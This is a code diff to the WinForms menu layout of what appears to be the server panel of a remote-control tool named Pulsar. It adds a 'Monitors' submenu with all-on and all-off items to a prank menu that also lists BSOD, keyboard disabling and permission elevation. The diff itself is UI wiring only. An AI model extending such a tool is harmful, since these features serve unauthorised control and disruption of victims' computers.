@@ -108,6 +108,9 @@ namespace Pulsar.Server.Forms
             cDTrayToolStripMenuItem = new ToolStripMenuItem();
             openToolStripMenuItem = new ToolStripMenuItem();
             closeToolStripMenuItem = new ToolStripMenuItem();
+            monitorsToolStripMenuItem = new ToolStripMenuItem();
+            allOffToolStripMenuItem = new ToolStripMenuItem();
+            allOnToolStripMenuItem = new ToolStripMenuItem();
             connectionToolStripMenuItem = new ToolStripMenuItem();
             elevatedToolStripMenuItem = new ToolStripMenuItem();
             elevateClientPermissionsToolStripMenuItem = new ToolStripMenuItem();
@@ -606,7 +609,7 @@ namespace Pulsar.Server.Forms
             // 
             // funMethodsToolStripMenuItem
             // 
-            funMethodsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { bSODToolStripMenuItem, cWToolStripMenuItem, swapMouseButtonsToolStripMenuItem, hideTaskBarToolStripMenuItem, disableEnableKeyboardToolStripMenuItem, cDTrayToolStripMenuItem });
+            funMethodsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { bSODToolStripMenuItem, cWToolStripMenuItem, swapMouseButtonsToolStripMenuItem, hideTaskBarToolStripMenuItem, disableEnableKeyboardToolStripMenuItem, cDTrayToolStripMenuItem, monitorsToolStripMenuItem });
             funMethodsToolStripMenuItem.Image = Properties.Resources.emoticon_evilgrin;
             funMethodsToolStripMenuItem.Name = "funMethodsToolStripMenuItem";
             funMethodsToolStripMenuItem.Size = new Size(179, 22);
@@ -656,7 +659,7 @@ namespace Pulsar.Server.Forms
             // 
             startToolStripMenuItem.Image = Properties.Resources.startbutton;
             startToolStripMenuItem.Name = "startToolStripMenuItem";
-            startToolStripMenuItem.Size = new Size(180, 22);
+            startToolStripMenuItem.Size = new Size(98, 22);
             startToolStripMenuItem.Text = "Start";
             startToolStripMenuItem.Click += startToolStripMenuItem_Click;
             // 
@@ -664,7 +667,7 @@ namespace Pulsar.Server.Forms
             // 
             stopToolStripMenuItem.Image = Properties.Resources.stopbutton;
             stopToolStripMenuItem.Name = "stopToolStripMenuItem";
-            stopToolStripMenuItem.Size = new Size(180, 22);
+            stopToolStripMenuItem.Size = new Size(98, 22);
             stopToolStripMenuItem.Text = "Stop";
             stopToolStripMenuItem.Click += stopToolStripMenuItem_Click;
             // 
@@ -691,6 +694,30 @@ namespace Pulsar.Server.Forms
             closeToolStripMenuItem.Size = new Size(180, 22);
             closeToolStripMenuItem.Text = "Close";
             closeToolStripMenuItem.Click += closeToolStripMenuItem_Click_1;
+            // 
+            // monitorsToolStripMenuItem
+            // 
+            monitorsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { allOffToolStripMenuItem, allOnToolStripMenuItem });
+            monitorsToolStripMenuItem.Image = Properties.Resources.monitoricon;
+            monitorsToolStripMenuItem.Name = "monitorsToolStripMenuItem";
+            monitorsToolStripMenuItem.Size = new Size(185, 22);
+            monitorsToolStripMenuItem.Text = "Monitors";
+            // 
+            // allOffToolStripMenuItem
+            // 
+            allOffToolStripMenuItem.Image = Properties.Resources.monitoron;
+            allOffToolStripMenuItem.Name = "allOffToolStripMenuItem";
+            allOffToolStripMenuItem.Size = new Size(180, 22);
+            allOffToolStripMenuItem.Text = "All On";
+            allOffToolStripMenuItem.Click += allOffToolStripMenuItem_Click;
+            // 
+            // allOnToolStripMenuItem
+            // 
+            allOnToolStripMenuItem.Image = Properties.Resources.monitoroff;
+            allOnToolStripMenuItem.Name = "allOnToolStripMenuItem";
+            allOnToolStripMenuItem.Size = new Size(180, 22);
+            allOnToolStripMenuItem.Text = "All Off";
+            allOnToolStripMenuItem.Click += allOnToolStripMenuItem_Click;
             // 
             // connectionToolStripMenuItem
             // 
@@ -2405,5 +2432,8 @@ namespace Pulsar.Server.Forms
         private ToolStripMenuItem cDTrayToolStripMenuItem;
         private ToolStripMenuItem openToolStripMenuItem;
         private ToolStripMenuItem closeToolStripMenuItem;
+        private ToolStripMenuItem monitorsToolStripMenuItem;
+        private ToolStripMenuItem allOffToolStripMenuItem;
+        private ToolStripMenuItem allOnToolStripMenuItem;
     }
 }
